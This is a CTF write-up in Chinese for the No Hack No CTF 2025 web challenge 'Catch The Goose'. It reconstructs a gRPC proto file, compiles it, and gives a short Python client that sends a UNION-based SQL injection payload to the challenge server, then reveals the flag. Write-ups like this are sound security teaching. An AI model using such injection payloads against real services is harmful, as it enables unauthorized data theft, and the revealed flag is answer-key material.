##### tags: `NoHackNoCTF_2025`
# No Hack No CTF 2025 Web : Catch The Goose

<style>
.red {
  color: red;
}
.blue {
  color: blue;
}
.purple {
  color: #7D3382;
}
.light_purple {
  color: #810cf5;
}
</style>

<span class=""></span>

## <span class="red">題目</span>

- ![image](https://hackmd.io/_uploads/ryPMB_8See.png)

## <span class="red">解題過程</span>

1. **根據題目給的 `server.py` 可以逆推出 `user.proto`**

    ```user.proto=
    syntax = "proto3";

    service UserService {
      rpc GetUser (UserRequest) returns (UserReply);
    }

    message UserRequest {
      string username = 1;
    }

    message UserReply {
      string data = 1;
    }
    ```

&emsp;

2. **然後用 python 開一個虛擬環境，準備裝 `grpcio-tools` ，用來跑 grpc 的編譯。**

- **開起並進入虛擬環境： `python -m venv venv;.\venv\Scripts\activate`** 
- **裝 `grpcio-tools`： `pip install grpcio grpcio-tools`**
- ![image](https://hackmd.io/_uploads/HJydRqUBgl.png)

- **裝完之後就能夠利用 `protoc` 編譯 `user.proto`**
- ![image](https://hackmd.io/_uploads/rJkRRqIree.png)

&emsp;

3. **完成後會產生 `user_pb2_grpc.py` 和 `user_pb2.py` ，接著就可以寫 `client.py` 來塞入 `SQL Injection` 的 payload 做互動，配合最一開始題目給的提示，就能夠拿到 flag 了 (deactivate 可以離開虛擬環境)**

- **題目給的提示：**
    - ![image](https://hackmd.io/_uploads/SJ71gi8rxx.png)

    ```python=
    import grpc
    import user_pb2, user_pb2_grpc

    def get_user(username):
        with grpc.insecure_channel('chal.78727867.xyz:14514') as channel:
            stub = user_pb2_grpc.UserServiceStub(channel)
            response = stub.GetUser(user_pb2.UserRequest(username=username))
            return response.data

    if __name__ == "__main__":
        print("[*] Try admin:")
        print(get_user("admin"))

        print("\n[*] Try SQLi:")
        injection = "' UNION SELECT value FROM users WHERE key='secret_flag'--"
        print(get_user(injection))
    ```

- ![image](https://hackmd.io/_uploads/By2VyjUHlx.png)

- **flag🚩 :`NHNC{lETs_cOoK_THe_GoOSE_:speaking_head::speaking_head::speaking_head:}`**